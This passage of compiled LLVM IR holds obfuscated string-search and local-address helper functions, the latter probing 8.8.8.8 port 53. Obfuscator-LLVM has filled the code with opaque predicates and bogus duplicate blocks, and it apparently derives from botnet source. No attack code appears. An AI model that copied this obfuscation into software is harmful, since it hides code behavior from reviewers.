  %11 = phi i1 [ false, %1 ], [ %9, %6 ]
  %12 = zext i1 %11 to i32
  ret i32 %12
}

; Function Attrs: noinline nounwind uwtable
define i32 @util_memsearch(i8*, i32, i8*, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  store i8* %0, i8** %6, align 8
  store i32 %1, i32* %7, align 4
  store i8* %2, i8** %8, align 8
  store i32 %3, i32* %9, align 4
  store i32 0, i32* %10, align 4
  store i32 0, i32* %11, align 4
  %12 = load i32, i32* %9, align 4
  %13 = load i32, i32* %7, align 4
  %14 = icmp sgt i32 %12, %13
  br i1 %14, label %15, label %16

; <label>:15:                                     ; preds = %4
  store i32 -1, i32* %5, align 4
  br label %98

; <label>:16:                                     ; preds = %4
  store i32 0, i32* %10, align 4
  br label %17

; <label>:17:                                     ; preds = %originalBBpart214, %16
  %18 = load i32, i32* %10, align 4
  %19 = load i32, i32* %7, align 4
  %20 = icmp slt i32 %18, %19
  br i1 %20, label %21, label %97

; <label>:21:                                     ; preds = %17
  %22 = load i8*, i8** %6, align 8
  %23 = load i32, i32* %10, align 4
  %24 = sext i32 %23 to i64
  %25 = getelementptr inbounds i8, i8* %22, i64 %24
  %26 = load i8, i8* %25, align 1
  %27 = sext i8 %26 to i32
  %28 = load i8*, i8** %8, align 8
  %29 = load i32, i32* %11, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds i8, i8* %28, i64 %30
  %32 = load i8, i8* %31, align 1
  %33 = sext i8 %32 to i32
  %34 = icmp eq i32 %27, %33
  br i1 %34, label %35, label %76

; <label>:35:                                     ; preds = %21
  %36 = load i32, i32* %11, align 4
  %37 = add nsw i32 %36, 1
  store i32 %37, i32* %11, align 4
  %38 = load i32, i32* %9, align 4
  %39 = icmp eq i32 %37, %38
  br i1 %39, label %40, label %59

; <label>:40:                                     ; preds = %35
  %41 = load i32, i32* @x.105
  %42 = load i32, i32* @y.106
  %43 = sub i32 %41, 1
  %44 = mul i32 %41, %43
  %45 = urem i32 %44, 2
  %46 = icmp eq i32 %45, 0
  %47 = icmp slt i32 %42, 10
  %48 = or i1 %46, %47
  br i1 %48, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %40
  %49 = load i32, i32* %10, align 4
  %50 = add nsw i32 %49, 1
  store i32 %50, i32* %5, align 4
  %51 = load i32, i32* @x.105
  %52 = load i32, i32* @y.106
  %53 = sub i32 %51, 1
  %54 = mul i32 %51, %53
  %55 = urem i32 %54, 2
  %56 = icmp eq i32 %55, 0
  %57 = icmp slt i32 %52, 10
  %58 = or i1 %56, %57
  br i1 %58, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %98

; <label>:59:                                     ; preds = %35
  %60 = load i32, i32* @x.105
  %61 = load i32, i32* @y.106
  %62 = sub i32 %60, 1
  %63 = mul i32 %60, %62
  %64 = urem i32 %63, 2
  %65 = icmp eq i32 %64, 0
  %66 = icmp slt i32 %61, 10
  %67 = or i1 %65, %66
  br i1 %67, label %originalBB8, label %originalBB8alteredBB

originalBB8:                                      ; preds = %originalBB8alteredBB, %59
  %68 = load i32, i32* @x.105
  %69 = load i32, i32* @y.106
  %70 = sub i32 %68, 1
  %71 = mul i32 %68, %70
  %72 = urem i32 %71, 2
  %73 = icmp eq i32 %72, 0
  %74 = icmp slt i32 %69, 10
  %75 = or i1 %73, %74
  br i1 %75, label %originalBBpart210, label %originalBB8alteredBB

originalBBpart210:                                ; preds = %originalBB8
  br label %77

; <label>:76:                                     ; preds = %21
  store i32 0, i32* %11, align 4
  br label %77

; <label>:77:                                     ; preds = %76, %originalBBpart210
  br label %78

; <label>:78:                                     ; preds = %77
  %79 = load i32, i32* @x.105
  %80 = load i32, i32* @y.106
  %81 = sub i32 %79, 1
  %82 = mul i32 %79, %81
  %83 = urem i32 %82, 2
  %84 = icmp eq i32 %83, 0
  %85 = icmp slt i32 %80, 10
  %86 = or i1 %84, %85
  br i1 %86, label %originalBB12, label %originalBB12alteredBB

originalBB12:                                     ; preds = %originalBB12alteredBB, %78
  %87 = load i32, i32* %10, align 4
  %88 = add nsw i32 %87, 1
  store i32 %88, i32* %10, align 4
  %89 = load i32, i32* @x.105
  %90 = load i32, i32* @y.106
  %91 = sub i32 %89, 1
  %92 = mul i32 %89, %91
  %93 = urem i32 %92, 2
  %94 = icmp eq i32 %93, 0
  %95 = icmp slt i32 %90, 10
  %96 = or i1 %94, %95
  br i1 %96, label %originalBBpart214, label %originalBB12alteredBB

originalBBpart214:                                ; preds = %originalBB12
  br label %17

; <label>:97:                                     ; preds = %17
  store i32 -1, i32* %5, align 4
  br label %98

; <label>:98:                                     ; preds = %97, %originalBBpart2, %15
  %99 = load i32, i32* %5, align 4
  ret i32 %99

originalBBalteredBB:                              ; preds = %originalBB, %40
  %100 = load i32, i32* %10, align 4
  %_ = shl i32 %100, 1
  %_1 = sub i32 0, %100
  %gen = add i32 %_1, 1
  %_2 = sub i32 %100, 1
  %gen3 = mul i32 %_2, 1
  %_4 = sub i32 0, %100
  %gen5 = add i32 %_4, 1
  %_6 = sub i32 %100, 1
  %gen7 = mul i32 %_6, 1
  %101 = add nsw i32 %100, 1
  store i32 %101, i32* %5, align 4
  br label %originalBB

originalBB8alteredBB:                             ; preds = %originalBB8, %59
  br label %originalBB8

originalBB12alteredBB:                            ; preds = %originalBB12, %78
  %102 = load i32, i32* %10, align 4
  %103 = add nsw i32 %102, 1
  store i32 %103, i32* %10, align 4
  br label %originalBB12
}

; Function Attrs: noinline nounwind uwtable
define i32 @util_stristr(i8*, i32, i8*) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8, align 1
  %12 = alloca i8, align 1
  store i8* %0, i8** %5, align 8
  store i32 %1, i32* %6, align 4
  store i8* %2, i8** %7, align 8
  %13 = load i8*, i8** %5, align 8
  store i8* %13, i8** %8, align 8
  %14 = load i8*, i8** %7, align 8
  %15 = call i32 @util_strlen(i8* %14)
  store i32 %15, i32* %9, align 4
  store i32 0, i32* %10, align 4
  br label %16

; <label>:16:                                     ; preds = %162, %3
  %17 = load i32, i32* @x.107
  %18 = load i32, i32* @y.108
  %19 = sub i32 %17, 1
  %20 = mul i32 %17, %19
  %21 = urem i32 %20, 2
  %22 = icmp eq i32 %21, 0
  %23 = icmp slt i32 %18, 10
  %24 = or i1 %22, %23
  br i1 %24, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %16
  %25 = load i32, i32* %6, align 4
  %26 = add nsw i32 %25, -1
  store i32 %26, i32* %6, align 4
  %27 = icmp sgt i32 %25, 0
  %28 = load i32, i32* @x.107
  %29 = load i32, i32* @y.108
  %30 = sub i32 %28, 1
  %31 = mul i32 %28, %30
  %32 = urem i32 %31, 2
  %33 = icmp eq i32 %32, 0
  %34 = icmp slt i32 %29, 10
  %35 = or i1 %33, %34
  br i1 %35, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %27, label %36, label %163

; <label>:36:                                     ; preds = %originalBBpart2
  %37 = load i32, i32* @x.107
  %38 = load i32, i32* @y.108
  %39 = sub i32 %37, 1
  %40 = mul i32 %37, %39
  %41 = urem i32 %40, 2
  %42 = icmp eq i32 %41, 0
  %43 = icmp slt i32 %38, 10
  %44 = or i1 %42, %43
  br i1 %44, label %originalBB12, label %originalBB12alteredBB

originalBB12:                                     ; preds = %originalBB12alteredBB, %36
  %45 = load i8*, i8** %8, align 8
  %46 = getelementptr inbounds i8, i8* %45, i32 1
  store i8* %46, i8** %8, align 8
  %47 = load i8, i8* %45, align 1
  store i8 %47, i8* %11, align 1
  %48 = load i8*, i8** %7, align 8
  %49 = load i32, i32* %10, align 4
  %50 = sext i32 %49 to i64
  %51 = getelementptr inbounds i8, i8* %48, i64 %50
  %52 = load i8, i8* %51, align 1
  store i8 %52, i8* %12, align 1
  %53 = load i8, i8* %11, align 1
  %54 = sext i8 %53 to i32
  %55 = icmp sge i32 %54, 65
  %56 = load i32, i32* @x.107
  %57 = load i32, i32* @y.108
  %58 = sub i32 %56, 1
  %59 = mul i32 %56, %58
  %60 = urem i32 %59, 2
  %61 = icmp eq i32 %60, 0
  %62 = icmp slt i32 %57, 10
  %63 = or i1 %61, %62
  br i1 %63, label %originalBBpart214, label %originalBB12alteredBB

originalBBpart214:                                ; preds = %originalBB12
  br i1 %55, label %64, label %88

; <label>:64:                                     ; preds = %originalBBpart214
  %65 = load i32, i32* @x.107
  %66 = load i32, i32* @y.108
  %67 = sub i32 %65, 1
  %68 = mul i32 %65, %67
  %69 = urem i32 %68, 2
  %70 = icmp eq i32 %69, 0
  %71 = icmp slt i32 %66, 10
  %72 = or i1 %70, %71
  br i1 %72, label %originalBB16, label %originalBB16alteredBB

originalBB16:                                     ; preds = %originalBB16alteredBB, %64
  %73 = load i8, i8* %11, align 1
  %74 = sext i8 %73 to i32
  %75 = icmp sle i32 %74, 90
  %76 = load i32, i32* @x.107
  %77 = load i32, i32* @y.108
  %78 = sub i32 %76, 1
  %79 = mul i32 %76, %78
  %80 = urem i32 %79, 2
  %81 = icmp eq i32 %80, 0
  %82 = icmp slt i32 %77, 10
  %83 = or i1 %81, %82
  br i1 %83, label %originalBBpart218, label %originalBB16alteredBB

originalBBpart218:                                ; preds = %originalBB16
  br i1 %75, label %84, label %88

; <label>:84:                                     ; preds = %originalBBpart218
  %85 = load i8, i8* %11, align 1
  %86 = sext i8 %85 to i32
  %87 = or i32 %86, 96
  br label %91

; <label>:88:                                     ; preds = %originalBBpart218, %originalBBpart214
  %89 = load i8, i8* %11, align 1
  %90 = sext i8 %89 to i32
  br label %91

; <label>:91:                                     ; preds = %88, %84
  %92 = phi i32 [ %87, %84 ], [ %90, %88 ]
  %93 = trunc i32 %92 to i8
  store i8 %93, i8* %11, align 1
  %94 = load i8, i8* %12, align 1
  %95 = sext i8 %94 to i32
  %96 = icmp sge i32 %95, 65
  br i1 %96, label %97, label %121

; <label>:97:                                     ; preds = %91
  %98 = load i8, i8* %12, align 1
  %99 = sext i8 %98 to i32
  %100 = icmp sle i32 %99, 90
  br i1 %100, label %101, label %121

; <label>:101:                                    ; preds = %97
  %102 = load i32, i32* @x.107
  %103 = load i32, i32* @y.108
  %104 = sub i32 %102, 1
  %105 = mul i32 %102, %104
  %106 = urem i32 %105, 2
  %107 = icmp eq i32 %106, 0
  %108 = icmp slt i32 %103, 10
  %109 = or i1 %107, %108
  br i1 %109, label %originalBB20, label %originalBB20alteredBB

originalBB20:                                     ; preds = %originalBB20alteredBB, %101
  %110 = load i8, i8* %12, align 1
  %111 = sext i8 %110 to i32
  %112 = or i32 %111, 96
  %113 = load i32, i32* @x.107
  %114 = load i32, i32* @y.108
  %115 = sub i32 %113, 1
  %116 = mul i32 %113, %115
  %117 = urem i32 %116, 2
  %118 = icmp eq i32 %117, 0
  %119 = icmp slt i32 %114, 10
  %120 = or i1 %118, %119
  br i1 %120, label %originalBBpart233, label %originalBB20alteredBB

originalBBpart233:                                ; preds = %originalBB20
  br label %140

; <label>:121:                                    ; preds = %97, %91
  %122 = load i32, i32* @x.107
  %123 = load i32, i32* @y.108
  %124 = sub i32 %122, 1
  %125 = mul i32 %122, %124
  %126 = urem i32 %125, 2
  %127 = icmp eq i32 %126, 0
  %128 = icmp slt i32 %123, 10
  %129 = or i1 %127, %128
  br i1 %129, label %originalBB35, label %originalBB35alteredBB

originalBB35:                                     ; preds = %originalBB35alteredBB, %121
  %130 = load i8, i8* %12, align 1
  %131 = sext i8 %130 to i32
  %132 = load i32, i32* @x.107
  %133 = load i32, i32* @y.108
  %134 = sub i32 %132, 1
  %135 = mul i32 %132, %134
  %136 = urem i32 %135, 2
  %137 = icmp eq i32 %136, 0
  %138 = icmp slt i32 %133, 10
  %139 = or i1 %137, %138
  br i1 %139, label %originalBBpart237, label %originalBB35alteredBB

originalBBpart237:                                ; preds = %originalBB35
  br label %140

; <label>:140:                                    ; preds = %originalBBpart237, %originalBBpart233
  %141 = phi i32 [ %112, %originalBBpart233 ], [ %131, %originalBBpart237 ]
  %142 = trunc i32 %141 to i8
  store i8 %142, i8* %12, align 1
  %143 = load i8, i8* %11, align 1
  %144 = sext i8 %143 to i32
  %145 = load i8, i8* %12, align 1
  %146 = sext i8 %145 to i32
  %147 = icmp eq i32 %144, %146
  br i1 %147, label %148, label %161

; <label>:148:                                    ; preds = %140
  %149 = load i32, i32* %10, align 4
  %150 = add nsw i32 %149, 1
  store i32 %150, i32* %10, align 4
  %151 = load i32, i32* %9, align 4
  %152 = icmp eq i32 %150, %151
  br i1 %152, label %153, label %160

; <label>:153:                                    ; preds = %148
  %154 = load i8*, i8** %8, align 8
  %155 = load i8*, i8** %5, align 8
  %156 = ptrtoint i8* %154 to i64
  %157 = ptrtoint i8* %155 to i64
  %158 = sub i64 %156, %157
  %159 = trunc i64 %158 to i32
  store i32 %159, i32* %4, align 4
  br label %164

; <label>:160:                                    ; preds = %148
  br label %162

; <label>:161:                                    ; preds = %140
  store i32 0, i32* %10, align 4
  br label %162

; <label>:162:                                    ; preds = %161, %160
  br label %16

; <label>:163:                                    ; preds = %originalBBpart2
  store i32 -1, i32* %4, align 4
  br label %164

; <label>:164:                                    ; preds = %163, %153
  %165 = load i32, i32* @x.107
  %166 = load i32, i32* @y.108
  %167 = sub i32 %165, 1
  %168 = mul i32 %165, %167
  %169 = urem i32 %168, 2
  %170 = icmp eq i32 %169, 0
  %171 = icmp slt i32 %166, 10
  %172 = or i1 %170, %171
  br i1 %172, label %originalBB39, label %originalBB39alteredBB

originalBB39:                                     ; preds = %originalBB39alteredBB, %164
  %173 = load i32, i32* %4, align 4
  %174 = load i32, i32* @x.107
  %175 = load i32, i32* @y.108
  %176 = sub i32 %174, 1
  %177 = mul i32 %174, %176
  %178 = urem i32 %177, 2
  %179 = icmp eq i32 %178, 0
  %180 = icmp slt i32 %175, 10
  %181 = or i1 %179, %180
  br i1 %181, label %originalBBpart241, label %originalBB39alteredBB

originalBBpart241:                                ; preds = %originalBB39
  ret i32 %173

originalBBalteredBB:                              ; preds = %originalBB, %16
  %182 = load i32, i32* %6, align 4
  %_ = shl i32 %182, -1
  %_1 = sub i32 0, %182
  %gen = add i32 %_1, -1
  %_2 = sub i32 %182, -1
  %gen3 = mul i32 %_2, -1
  %_4 = shl i32 %182, -1
  %_5 = sub i32 %182, -1
  %gen6 = mul i32 %_5, -1
  %_7 = sub i32 0, %182
  %gen8 = add i32 %_7, -1
  %_9 = sub i32 %182, -1
  %gen10 = mul i32 %_9, -1
  %_11 = shl i32 %182, -1
  %183 = add nsw i32 %182, -1
  store i32 %183, i32* %6, align 4
  %184 = icmp sgt i32 %182, 0
  br label %originalBB

originalBB12alteredBB:                            ; preds = %originalBB12, %36
  %185 = load i8*, i8** %8, align 8
  %186 = getelementptr inbounds i8, i8* %185, i32 1
  store i8* %186, i8** %8, align 8
  %187 = load i8, i8* %185, align 1
  store i8 %187, i8* %11, align 1
  %188 = load i8*, i8** %7, align 8
  %189 = load i32, i32* %10, align 4
  %190 = sext i32 %189 to i64
  %191 = getelementptr inbounds i8, i8* %188, i64 %190
  %192 = load i8, i8* %191, align 1
  store i8 %192, i8* %12, align 1
  %193 = load i8, i8* %11, align 1
  %194 = sext i8 %193 to i32
  %195 = icmp sge i32 %194, 65
  br label %originalBB12

originalBB16alteredBB:                            ; preds = %originalBB16, %64
  %196 = load i8, i8* %11, align 1
  %197 = sext i8 %196 to i32
  %198 = icmp sle i32 %197, 90
  br label %originalBB16

originalBB20alteredBB:                            ; preds = %originalBB20, %101
  %199 = load i8, i8* %12, align 1
  %200 = sext i8 %199 to i32
  %_21 = sub i32 %200, 96
  %gen22 = mul i32 %_21, 96
  %_23 = sub i32 %200, 96
  %gen24 = mul i32 %_23, 96
  %_25 = sub i32 %200, 96
  %gen26 = mul i32 %_25, 96
  %_27 = sub i32 0, %200
  %gen28 = add i32 %_27, 96
  %_29 = sub i32 %200, 96
  %gen30 = mul i32 %_29, 96
  %_31 = shl i32 %200, 96
  %201 = or i32 %200, 96
  br label %originalBB20

originalBB35alteredBB:                            ; preds = %originalBB35, %121
  %202 = load i8, i8* %12, align 1
  %203 = sext i8 %202 to i32
  br label %originalBB35

originalBB39alteredBB:                            ; preds = %originalBB39, %164
  %204 = load i32, i32* %4, align 4
  br label %originalBB39
}

; Function Attrs: noinline nounwind uwtable
define i32 @util_local_addr() #0 {
  %1 = load i32, i32* @x.109
  %2 = load i32, i32* @y.110
  %3 = sub i32 %1, 1
  %4 = mul i32 %1, %3
  %5 = urem i32 %4, 2
  %6 = icmp eq i32 %5, 0
  %7 = icmp slt i32 %2, 10
  %8 = or i1 %6, %7
  br i1 %8, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %0
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca %struct.sockaddr_in, align 4
  %12 = alloca i32, align 4
  %13 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %14 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 0, i32* %10, align 4
  store i32 16, i32* %12, align 4
  %15 = call i32* @__errno_location() #7
  store i32 0, i32* %15, align 4
  %16 = call i32 @socket(i32 2, i32 2, i32 0) #6
  store i32 %16, i32* %10, align 4
  %17 = icmp eq i32 %16, -1
  %18 = load i32, i32* @x.109
  %19 = load i32, i32* @y.110
  %20 = sub i32 %18, 1
  %21 = mul i32 %18, %20
  %22 = urem i32 %21, 2
  %23 = icmp eq i32 %22, 0
  %24 = icmp slt i32 %19, 10
  %25 = or i1 %23, %24
  br i1 %25, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %17, label %26, label %43

; <label>:26:                                     ; preds = %originalBBpart2
  %27 = load i32, i32* @x.109
  %28 = load i32, i32* @y.110
  %29 = sub i32 %27, 1
  %30 = mul i32 %27, %29
  %31 = urem i32 %30, 2
  %32 = icmp eq i32 %31, 0
  %33 = icmp slt i32 %28, 10
  %34 = or i1 %32, %33
  br i1 %34, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %26
  store i32 0, i32* %9, align 4
  %35 = load i32, i32* @x.109
  %36 = load i32, i32* @y.110
  %37 = sub i32 %35, 1
  %38 = mul i32 %35, %37
  %39 = urem i32 %38, 2
  %40 = icmp eq i32 %39, 0
  %41 = icmp slt i32 %36, 10
  %42 = or i1 %40, %41
  br i1 %42, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %83

; <label>:43:                                     ; preds = %originalBBpart2
  %44 = load i32, i32* @x.109
  %45 = load i32, i32* @y.110
  %46 = sub i32 %44, 1
  %47 = mul i32 %44, %46
  %48 = urem i32 %47, 2
  %49 = icmp eq i32 %48, 0
  %50 = icmp slt i32 %45, 10
  %51 = or i1 %49, %50
  br i1 %51, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %43
  %52 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 0
  store i16 2, i16* %52, align 4
  %53 = call i32 @htonl(i32 134744072) #7
  %54 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 2
  %55 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %54, i32 0, i32 0
  store i32 %53, i32* %55, align 4
  %56 = call zeroext i16 @htons(i16 zeroext 53) #7
  %57 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 1
  store i16 %56, i16* %57, align 2
  %58 = load i32, i32* %10, align 4
  %59 = bitcast %union.__CONST_SOCKADDR_ARG* %13 to %struct.sockaddr**
  %60 = bitcast %struct.sockaddr_in* %11 to %struct.sockaddr*
  store %struct.sockaddr* %60, %struct.sockaddr** %59, align 8
  %61 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %13, i32 0, i32 0
  %62 = load %struct.sockaddr*, %struct.sockaddr** %61, align 8
  %63 = call i32 @connect(i32 %58, %struct.sockaddr* %62, i32 16)
  %64 = load i32, i32* %10, align 4
  %65 = bitcast %union.__CONST_SOCKADDR_ARG* %14 to %struct.sockaddr**
  %66 = bitcast %struct.sockaddr_in* %11 to %struct.sockaddr*
  store %struct.sockaddr* %66, %struct.sockaddr** %65, align 8
  %67 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %14, i32 0, i32 0
  %68 = load %struct.sockaddr*, %struct.sockaddr** %67, align 8
  %69 = call i32 @getsockname(i32 %64, %struct.sockaddr* %68, i32* %12) #6
  %70 = load i32, i32* %10, align 4
  %71 = call i32 @close(i32 %70)
  %72 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 2
  %73 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %72, i32 0, i32 0
  %74 = load i32, i32* %73, align 4
  store i32 %74, i32* %9, align 4
  %75 = load i32, i32* @x.109
  %76 = load i32, i32* @y.110
  %77 = sub i32 %75, 1
  %78 = mul i32 %75, %77
  %79 = urem i32 %78, 2
  %80 = icmp eq i32 %79, 0
  %81 = icmp slt i32 %76, 10
  %82 = or i1 %80, %81
  br i1 %82, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %83

; <label>:83:                                     ; preds = %originalBBpart28, %originalBBpart24
  %84 = load i32, i32* %9, align 4
  ret i32 %84

originalBBalteredBB:                              ; preds = %originalBB, %0
  %85 = alloca i32, align 4
  %86 = alloca i32, align 4
  %87 = alloca %struct.sockaddr_in, align 4
  %88 = alloca i32, align 4
  %89 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %90 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 0, i32* %86, align 4
  store i32 16, i32* %88, align 4
  %91 = call i32* @__errno_location() #7
  store i32 0, i32* %91, align 4
  %92 = call i32 @socket(i32 2, i32 2, i32 0) #6
  store i32 %92, i32* %86, align 4
  %93 = icmp eq i32 %92, -1
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %26
  store i32 0, i32* %9, align 4
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %43
  %94 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 0
  store i16 2, i16* %94, align 4
  %95 = call i32 @htonl(i32 134744072) #7
  %96 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 2
  %97 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %96, i32 0, i32 0
  store i32 %95, i32* %97, align 4
  %98 = call zeroext i16 @htons(i16 zeroext 53) #7
  %99 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 1
  store i16 %98, i16* %99, align 2
  %100 = load i32, i32* %10, align 4
  %101 = bitcast %union.__CONST_SOCKADDR_ARG* %13 to %struct.sockaddr**
  %102 = bitcast %struct.sockaddr_in* %11 to %struct.sockaddr*
  store %struct.sockaddr* %102, %struct.sockaddr** %101, align 8
  %103 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %13, i32 0, i32 0
  %104 = load %struct.sockaddr*, %struct.sockaddr** %103, align 8
  %105 = call i32 @connect(i32 %100, %struct.sockaddr* %104, i32 16)
  %106 = load i32, i32* %10, align 4
  %107 = bitcast %union.__CONST_SOCKADDR_ARG* %14 to %struct.sockaddr**
  %108 = bitcast %struct.sockaddr_in* %11 to %struct.sockaddr*
  store %struct.sockaddr* %108, %struct.sockaddr** %107, align 8
  %109 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %14, i32 0, i32 0
  %110 = load %struct.sockaddr*, %struct.sockaddr** %109, align 8
  %111 = call i32 @getsockname(i32 %106, %struct.sockaddr* %110, i32* %12) #6
  %112 = load i32, i32* %10, align 4
  %113 = call i32 @close(i32 %112)
  %114 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 2
  %115 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %114, i32 0, i32 0
  %116 = load i32, i32* %115, align 4
  store i32 %116, i32* %9, align 4
  br label %originalBB6
}

; Function Attrs: nounwind
declare i32 @getsockname(i32, %struct.sockaddr*, i32*) #1

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { argmemonly nounwind }
attributes #6 = { nounwind }
attributes #7 = { nounwind readnone }
attributes #8 = { noreturn nounwind }

!llvm.ident = !{!0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146812302}
!2 = !{i32 -2146811893}
